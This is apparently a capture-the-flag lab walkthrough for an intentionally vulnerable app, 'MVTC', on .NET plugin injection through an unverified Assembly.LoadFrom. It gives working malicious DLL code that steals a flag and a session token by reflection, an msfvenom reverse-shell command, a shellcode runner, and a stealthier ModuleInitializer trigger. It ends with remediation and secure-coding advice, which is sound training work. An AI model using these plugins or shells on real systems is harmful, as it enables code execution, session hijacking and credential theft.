# #17 — .NET Assembly.Load / AppDomain injection

**Category:** Process injection · **Tier:** MEDIUM · **Points:** 100 · **CWE:** CWE-470

## Objective

MVTC calls `Assembly.LoadFrom(...)` on a plugin path at startup without any strong-name / Authenticode verification. Drop a malicious .NET DLL into the plugin path; its **static constructor** fires inside the host's AppDomain the first time any type is touched; it reads `InjectionSentinels.FlagForDotNetAssembly` by reflection and writes it out.

This is the easiest of the injection family — no Win32 ritual, no shellcode, just a managed DLL and a path write.

## Prerequisites

- .NET 10 SDK
- Any text editor + `dotnet` CLI
- Write access to one of the plugin load paths MVTC searches

---

## Where MVTC loads plugins

MVTC searches:

```
%APPDATA%\MVTC\plugins\
C:\Program Files\M14R41 Labs\MVTC\plugins\
```

The first one is user-writable. Create it:

```powershell
mkdir "$env:APPDATA\MVTC\plugins" -ErrorAction SilentlyContinue
```

---

## Malicious plugin

Create a tiny .NET DLL project:

```powershell
mkdir mvtc_plugin_17
cd mvtc_plugin_17
dotnet new classlib -f net10.0 -n MvtcPlugin17
cd MvtcPlugin17
```

Replace `Class1.cs` with:

```csharp
// Class1.cs
using System;
using System.IO;
using System.Reflection;

namespace MvtcPlugin17;

public static class Loader
{
    // Static constructor fires the first time any member of this type
    // is touched by the host. MVTC's plugin loader calls GetType("Loader")
    // on each assembly it finds, which triggers us.
    static Loader()
    {
        try { Steal(); } catch { /* swallow so we don't crash MVTC */ }
    }

    public static void Init() { /* no-op; forces type init */ }

    private static void Steal()
    {
        // Walk every loaded assembly looking for MVTC.Core
        foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
        {
            if (asm.GetName().Name != "MVTC.Core") continue;

            // Reflect into the static class
            var t = asm.GetType("MVTC.Core.Services.Vuln.InjectionSentinels");
            if (t == null) continue;

            var prop = t.GetProperty("FlagForDotNetAssembly",
                BindingFlags.Public | BindingFlags.Static);
            var flag = prop?.GetValue(null) as string;
            if (string.IsNullOrEmpty(flag)) continue;

            File.WriteAllText(@"C:\Users\Public\v17.txt", flag);
            return;
        }
    }
}
```

Target .NET 10 (match the host). Edit `MvtcPlugin17.csproj`:

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net10.0</TargetFramework>
    <Nullable>enable</Nullable>
    <AssemblyName>MvtcPlugin17</AssemblyName>
    <GenerateDocumentationFile>false</GenerateDocumentationFile>
  </PropertyGroup>
</Project>
```

Build:

```powershell
dotnet build -c Release
```

Produces `bin\Release\net10.0\MvtcPlugin17.dll`.

---

## Deploy and trigger

```powershell
# 1. Copy the plugin into the user-writable plugin path
copy .\bin\Release\net10.0\MvtcPlugin17.dll "$env:APPDATA\MVTC\plugins\"

# 2. Launch MVTC (or restart it if already running)
#    The plugin loader will Assembly.LoadFrom() your DLL,
#    walk its public types, and inadvertently trigger the static ctor.

# 3. Collect
type C:\Users\Public\v17.txt
```

Expected: `MVTC{v17_net_<...>}` → submit for `+100 pts`.

---

## Why the plugin loader triggers us

MVTC's loader (see `MVTC.Core.Services.Vuln.DllHelperLoader`) iterates files in `plugins\`, calls `Assembly.LoadFrom(path)` on each, and then reflects over the result (looks for public `[MvtcPlugin]`-marked types). Reflection over any public type triggers the type's static constructor, including types we authored. We don't need the host to actually "activate" our plugin — just touching our type is enough.

The host's own code reflects into `GetTypes()`, so you don't even need a marker attribute. Simply shipping a type with a static constructor is sufficient.

---

## Alternate trigger: `ModuleInitializer`

A cleaner trigger is C#'s `[ModuleInitializer]` method:

```csharp
using System.Runtime.CompilerServices;

internal static class ModuleBootstrap
{
    [ModuleInitializer]
    internal static void Init() => Loader.Init();
}
```

A `ModuleInitializer` fires on the first type load in the module, so you don't need any public type exposed. This is quieter in loader logs.

---

## Common failure modes

| Symptom | Fix |
|---|---|
| v17.txt not created | Plugin path wrong — check that MVTC's `DllHelperLoader` prints something to `audit.log` when it loads plugins |
| `BadImageFormatException` | Target framework mismatch. MVTC runs on `net10.0-windows`; your plugin must be `net10.0` or lower |
| `FileLoadException: strong name` | MVTC isn't enforcing signatures (that's the whole bug). If you see this, you grabbed the wrong `.dll` |
| Flag is empty string | You hit MVTC before login completed. `InjectionSentinels.Initialize()` runs after `AuthService` is wired up. Launch, log in, then drop the plugin and restart |

---

---

## Concept — what this attack actually is

`.NET`'s `Assembly.LoadFrom(path)` reads a managed PE from disk and jits its code into the current `AppDomain` (or in modern .NET, into an `AssemblyLoadContext`). If the host then **reflects over the loaded assembly** (`asm.GetTypes()`, `asm.CreateInstance(...)`, `Activator.CreateInstance(...)`), the CLR runs that type's **static constructor** (`.cctor`) the first time the type is touched. Static constructors run with the host's permissions and have full access to every static in the AppDomain — including other assemblies' sensitive statics (sentinels, keys, cached credentials).

A malicious plugin exploits two things:
1. The host blindly loads anything in a known plugin folder (writeable to the attacker)
2. The host reflects over the loaded types, implicitly triggering `.cctor`

**Why this is easier than native injection:** no Win32 debugging rights, no shellcode, no bitness matching, no AV signatures. It's just a managed DLL in a folder. On every red-team engagement involving a .NET application with a plugin surface, this is the first thing to try.

---

## Discovery — how to spot this in a real target

Signs the target is vulnerable:

1. **Plugin folder documentation** → the app's docs mention "drop extensions in …". Example: `%APPDATA%\MVTC\plugins\`
2. **`Assembly.LoadFrom(...)` grep** → decompile with dnSpy and grep the strings for `LoadFrom|LoadFile|Assembly.Load\b`. Each hit is a potential injection vector
3. **Writable paths in the Assembly resolver** → `AppDomain.CurrentDomain.AssemblyResolve` handlers that read from `%APPDATA%`, `%LOCALAPPDATA%`, or any user-writeable Program Data folder
4. **No strong-name verification** → if the host doesn't call `AssemblyName.GetPublicKeyToken` to check plugins, any DLL loads
5. **No Authenticode verification** → `WinVerifyTrust` isn't called on the plugin path

For MVTC specifically: `MVTC.Core.Services.Vuln.DllHelperLoader` walks `%APPDATA%\MVTC\plugins` at startup. Exactly the discovery pattern above.

---

## Impact demonstrations

### 1. Pop calc.exe

Replace the plugin's `Steal()` with:

```csharp
System.Diagnostics.Process.Start("calc.exe");
```

Rebuild, drop in `%APPDATA%\MVTC\plugins\`, restart MVTC. `calc.exe` opens with MVTC as the parent process.

### 2. Reverse shell (managed shellcode runner)

Generate shellcode:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f csharp
```

Paste into the plugin:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace MvtcPlugin17;

public static class Loader
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lp, UIntPtr sz, uint type, uint prot);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr sa, UIntPtr sz, IntPtr fn,
                                      IntPtr arg, uint flags, IntPtr tid);

    static byte[] shellcode = new byte[] {
        0xfc, 0x48, 0x83, 0xe4, 0xf0, /* …msfvenom bytes… */
    };

    static Loader()
    {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length,
                                  0x1000 | 0x2000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```

Build, deploy, restart MVTC, catch the shell with `nc -lvnp 4444`. Shell lands as the user running MVTC — identical identity to the host.

### 3. Session token theft (business impact)

Direct read of MVTC's own session token:

```csharp
static Loader()
{
    foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
    {
        if (asm.GetName().Name != "MVTC.Core") continue;
        var authType = asm.GetType("MVTC.Core.Services.AuthService");
        var session  = authType.GetProperty("CurrentSession",
                        BindingFlags.Public | BindingFlags.Static)?.GetValue(null);
        if (session == null) continue;
        var token = session.GetType().GetProperty("Token").GetValue(session);
        File.WriteAllText(@"C:\Users\Public\mvtc_session.txt", token.ToString());
    }
}
```

You now have the authenticated session token. Replay it against the backend API, named pipe server, or vault service — same post-exploitation chain as any OAuth token theft.

---

## Report writeup template

**Finding title:** .NET plugin injection via unverified `Assembly.LoadFrom` from user-writable path

**Severity:** High (CVSS 7.5)

**CWE:** CWE-470 (Use of Externally-Controlled Input to Select Classes or Code)

**Description:** The MVTC client enumerates `%APPDATA%\MVTC\plugins\` at startup and calls `Assembly.LoadFrom(path)` on every `.dll` without strong-name verification, Authenticode verification, or allowlisting. The loader then reflects over the public types of each loaded assembly, which triggers each type's static constructor. An attacker who can write to `%APPDATA%\MVTC\plugins\` (any user) gets arbitrary code execution inside MVTC with full access to its managed statics (session tokens, encryption keys, cached credentials).

**Impact:** Session hijacking (steal `AuthService.CurrentSession`), key theft (`HardcodedSecrets.*`), backend abuse (replay session token), reverse shell as MVTC user. Chainable with #10/#11 for admin.

**Remediation:**
- Require strong-named plugins or Authenticode-signed plugins + `WinVerifyTrust`
- Load plugins into a collectible, isolated `AssemblyLoadContext`
- Pin plugin path to `Program Files` subfolder with service ACLs
- Explicitly `GetType("PluginEntry")` instead of `GetTypes()` — avoids triggering unrelated static constructors
- Zero sensitive statics before plugin discovery

---

## Secure code fix

- **Require Authenticode signatures** on plugins; use `WinVerifyTrust` or `Microsoft.AspNetCore.DataProtection.KeyManagement.XmlEncryption` style verification before `Assembly.LoadFrom`
- Use a **strong-named** plugin contract — `Assembly.Load(name)` with a known public key token, not `Assembly.LoadFrom(path)`
- Load plugins into a **separate `AssemblyLoadContext`** that can be unloaded and that's isolated from host statics; use `Collectible = true`
- Pin plugins to a **sealed well-known path** that only an admin can write (`Program Files` under service ACLs) — never `%APPDATA%`
- Audit the plugin's `GetTypes()` and only touch types that implement the plugin contract interface — this prevents random static constructors from running
- Scrub sensitive statics (sentinels, keys) before loading any plugin
